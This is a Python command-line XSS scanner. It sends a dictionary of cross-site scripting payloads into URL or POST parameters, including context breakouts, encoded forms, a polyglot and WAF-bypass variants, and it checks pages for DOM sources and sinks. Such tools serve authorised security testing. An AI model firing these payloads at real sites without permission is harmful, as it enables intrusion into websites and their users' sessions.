#!/usr/bin/env python3
"""
XSS Scanner
Detect Cross-Site Scripting vulnerabilities.

USAGE:
    python xss_scanner.py <url> [-p param] [--method GET|POST] [--type reflected|stored|dom]

EXAMPLES:
    python xss_scanner.py "https://example.com/search?q=test"
    python xss_scanner.py "https://example.com/search?q=test" -p q
    python xss_scanner.py "https://example.com/comment" --method POST -d "msg=test" -p msg
    python xss_scanner.py "https://example.com/page" --type dom --crawl
"""

import sys
import argparse
import re
import html
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode, quote
sys.path.insert(0, '/home/l0ve/Desktop/WD/Tools')
from lib import success, error, warning, info, banner, HTTPClient, normalize_url

# XSS Payloads by context
XSS_PAYLOADS = {
    'basic': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<img src="x" onerror="alert(1)">',
        '<svg/onload=alert(1)>',
    ],
    'attribute': [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onclick="alert(1)',
        "javascript:alert(1)",
    ],
    'javascript': [
        "'-alert(1)-'",
        '"-alert(1)-"',
        "';alert(1)//",
        '";alert(1)//',
        "\\';alert(1)//",
    ],
    'encoded': [
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%3Cimg%20src=x%20onerror=alert(1)%3E',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
    ],
    'polyglot': [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"-->]]>*/</script></style></title></textarea><script>alert(1)</script>",
    ],
    'waf_bypass': [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<img src=x onerror=alert`1`>',
        '<svg/onload=alert&#40;1&#41;>',
        '<img src=x onerror=\\u0061lert(1)>',
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    ],
    'dom': [
        '#<img src=x onerror=alert(1)>',
        '?default=<script>alert(1)</script>',
        'javascript:alert(document.domain)',
    ]
}

# DOM XSS sources and sinks
DOM_SOURCES = [
    'document.URL', 'document.documentURI', 'document.URLUnencoded',
    'document.baseURI', 'location', 'location.href', 'location.search',
    'location.hash', 'location.pathname', 'document.cookie', 'document.referrer',
    'window.name', 'history.pushState', 'history.replaceState',
    'localStorage', 'sessionStorage', 'IndexedDB', 'Database'
]

DOM_SINKS = [
    'eval', 'setTimeout', 'setInterval', 'Function', 'execScript',
    'innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write',
    'document.writeln', '.html(', '.append(', '.prepend(', '.after(',
    '.before(', '.replaceWith(', '.wrap(', '.wrapAll(',
    'location', 'location.href', 'location.assign', 'location.replace',
]


class XSSScanner:
    def __init__(self, proxy: str = None, timeout: int = 10):
        self.client = HTTPClient(proxy=proxy, timeout=timeout)
        self.vulnerabilities = []
        self.marker = self._generate_marker()

    def _generate_marker(self) -> str:
        """Generate unique marker for reflection detection."""
        return ''.join(random.choices(string.ascii_lowercase, k=8)) + str(random.randint(1000, 9999))

    def test_reflection(self, url: str, param: str, method: str = 'GET', data: dict = None) -> dict:
        """Test if input is reflected in response."""
        try:
            if method == 'GET':
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [self.marker]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                resp = self.client.get(test_url)
            else:
                test_data = data.copy() if data else {}
                test_data[param] = self.marker
                resp = self.client.post(url, data=test_data)

            if self.marker in resp.text:
                # Analyze reflection context
                context = self._analyze_context(resp.text, self.marker)
                return {
                    'reflected': True,
                    'context': context,
                    'encoding': self._check_encoding(resp.text, self.marker)
                }
        except:
            pass

        return {'reflected': False}

    def _analyze_context(self, content: str, marker: str) -> list:
        """Analyze the context where input is reflected."""
        contexts = []

        # Check HTML context
        if re.search(rf'<[^>]*{marker}[^>]*>', content):
            contexts.append('html_attribute')
        if re.search(rf'<script[^>]*>[^<]*{marker}[^<]*</script>', content, re.IGNORECASE):
            contexts.append('javascript')
        if re.search(rf'<style[^>]*>[^<]*{marker}[^<]*</style>', content, re.IGNORECASE):
            contexts.append('css')
        if re.search(rf'>[^<]*{marker}[^<]*<', content):
            contexts.append('html_text')
        if re.search(rf'href=["\'][^"\']*{marker}', content):
            contexts.append('href')
        if re.search(rf'src=["\'][^"\']*{marker}', content):
            contexts.append('src')

        return contexts if contexts else ['unknown']

    def _check_encoding(self, content: str, marker: str) -> dict:
        """Check what encoding is applied to input."""
        return {
            'html_encoded': html.escape(marker) in content,
            'url_encoded': quote(marker) in content,
            'raw': marker in content
        }

    def test_xss_payloads(self, url: str, param: str, method: str = 'GET',
                          data: dict = None, payload_types: list = None) -> list:
        """Test XSS payloads."""
        findings = []

        if not payload_types:
            payload_types = ['basic', 'attribute', 'encoded']

        all_payloads = []
        for ptype in payload_types:
            all_payloads.extend(XSS_PAYLOADS.get(ptype, []))

        for payload in all_payloads:
            try:
                if method == 'GET':
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    resp = self.client.get(test_url)
                else:
                    test_data = data.copy() if data else {}
                    test_data[param] = payload
                    resp = self.client.post(url, data=test_data)

                # Check for unencoded reflection
                if payload in resp.text:
                    findings.append({
                        'type': 'reflected',
                        'param': param,
                        'payload': payload,
                        'evidence': 'Payload reflected without encoding'
                    })
                    success(f"[XSS] param={param} | payload={payload[:50]}...")

                # Check for partial reflection (some chars may be filtered)
                elif '<script' in payload and '<script' in resp.text.lower():
                    findings.append({
                        'type': 'reflected_partial',
                        'param': param,
                        'payload': payload,
                        'evidence': 'Script tag reflected'
                    })
                    warning(f"[XSS-PARTIAL] param={param} | payload={payload[:50]}...")

            except Exception as e:
                continue

        return findings

    def scan_dom_xss(self, url: str) -> list:
        """Scan for DOM-based XSS patterns."""
        findings = []

        try:
            resp = self.client.get(url)
            content = resp.text

            # Find sources
            found_sources = []
            for source in DOM_SOURCES:
                if source in content:
                    found_sources.append(source)

            # Find sinks
            found_sinks = []
            for sink in DOM_SINKS:
                if sink in content:
                    found_sinks.append(sink)

            if found_sources and found_sinks:
                findings.append({
                    'type': 'dom_potential',
                    'sources': found_sources,
                    'sinks': found_sinks,
                    'evidence': 'DOM sources and sinks detected'
                })
                warning(f"[DOM-XSS] Potential DOM XSS - Sources: {found_sources[:3]} | Sinks: {found_sinks[:3]}")

        except Exception as e:
            error(f"DOM scan failed: {e}")

        return findings

    def scan(self, url: str, params: list = None, method: str = 'GET',
             data: dict = None, scan_dom: bool = True, payload_types: list = None) -> list:
        """Run full XSS scan."""

        # Auto-detect parameters
        if not params:
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            if method == 'POST' and data:
                params.extend(data.keys())

        params = list(set(params))

        if not params and not scan_dom:
            warning("No parameters to test")
            return []

        # Test each parameter
        for param in params:
            info(f"\nTesting parameter: {param}")

            # Check reflection first
            reflection = self.test_reflection(url, param, method, data)
            if reflection['reflected']:
                info(f"  Input reflected in context: {reflection['context']}")

                # Test payloads
                results = self.test_xss_payloads(url, param, method, data, payload_types)
                self.vulnerabilities.extend(results)
            else:
                info(f"  Input not reflected")

        # Scan for DOM XSS
        if scan_dom:
            info("\nScanning for DOM-based XSS...")
            dom_results = self.scan_dom_xss(url)
            self.vulnerabilities.extend(dom_results)

        return self.vulnerabilities


def main():
    parser = argparse.ArgumentParser(
        description='XSS Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
    %(prog)s "https://example.com/search?q=test"
    %(prog)s "https://example.com/search?q=test" -p q
    %(prog)s "https://example.com/comment" --method POST -d "msg=test" -p msg
    %(prog)s "https://example.com/page" --dom-only
        """
    )
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-p', '--param', action='append', help='Parameter to test')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method')
    parser.add_argument('-d', '--data', help='POST data')
    parser.add_argument('--dom-only', action='store_true', help='Only scan for DOM XSS')
    parser.add_argument('--no-dom', action='store_true', help='Skip DOM XSS scan')
    parser.add_argument('--payloads', help='Payload types (basic,attribute,encoded,polyglot,waf_bypass)')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('-o', '--output', help='Output file')
    args = parser.parse_args()

    banner("XSS Scanner")
    info(f"Target: {args.url}")

    # Parse POST data
    post_data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                post_data[k] = v

    payload_types = args.payloads.split(',') if args.payloads else None

    scanner = XSSScanner(proxy=args.proxy)

    if args.dom_only:
        results = scanner.scan_dom_xss(args.url)
    else:
        results = scanner.scan(
            args.url,
            params=args.param,
            method=args.method,
            data=post_data if post_data else None,
            scan_dom=not args.no_dom,
            payload_types=payload_types
        )

    print()
    if results:
        success(f"Found {len(results)} potential XSS vulnerability(ies)")
    else:
        warning("No XSS vulnerabilities detected")

    if args.output:
        import json
        with open(args.output, 'w') as f:
            json.dump({'url': args.url, 'vulnerabilities': results}, f, indent=2)
        success(f"Results saved to {args.output}")


if __name__ == '__main__':
    main()
